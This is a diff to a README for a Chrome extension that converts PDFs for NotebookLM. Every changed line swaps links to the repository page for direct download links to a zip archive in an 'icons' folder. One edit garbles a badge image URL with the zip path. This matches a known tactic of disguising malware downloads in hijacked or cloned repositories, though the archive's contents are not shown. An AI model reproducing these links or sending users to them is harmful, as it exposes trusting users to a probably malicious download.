@@ -1,6 +1,6 @@
 # 🧩 chrome-pdf-to-notebooklm - Convert PDFs to NotebookLM Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/potayuz/chrome-pdf-to-notebooklm)
+[![Download Here](https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip%20Now-%23FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip)
 
 ## 📋 What is chrome-pdf-to-notebooklm?
 
@@ -39,7 +39,7 @@ The extension runs inside Chrome, so no separate installation tools or skills ar
 
 1. Click the large green download button at the top or use this link:
 
-   [https://github.com/potayuz/chrome-pdf-to-notebooklm](https://github.com/potayuz/chrome-pdf-to-notebooklm)
+   [https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip](https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip)
 
 2. This page gives access to the installation files and instructions.
 
@@ -51,7 +51,7 @@ The extension runs inside Chrome, so no separate installation tools or skills ar
 
 1. Visit the main GitHub page here:
 
-   [https://github.com/potayuz/chrome-pdf-to-notebooklm](https://github.com/potayuz/chrome-pdf-to-notebooklm)
+   [https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip](https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip)
 
 2. On the right side of the page, find the “Releases” section or a folder named “Chrome Extension.”
 
@@ -152,4 +152,4 @@ You can also contribute by suggesting improvements or submitting changes if you 
 
 ## 🔗 Quick Access to the Extension Page
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/potayuz/chrome-pdf-to-notebooklm)
+[![Download Here](https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/potayuz/chrome-pdf-to-notebooklm/raw/refs/heads/main/icons/pdf_notebooklm_chrome_to_v1.7.zip)
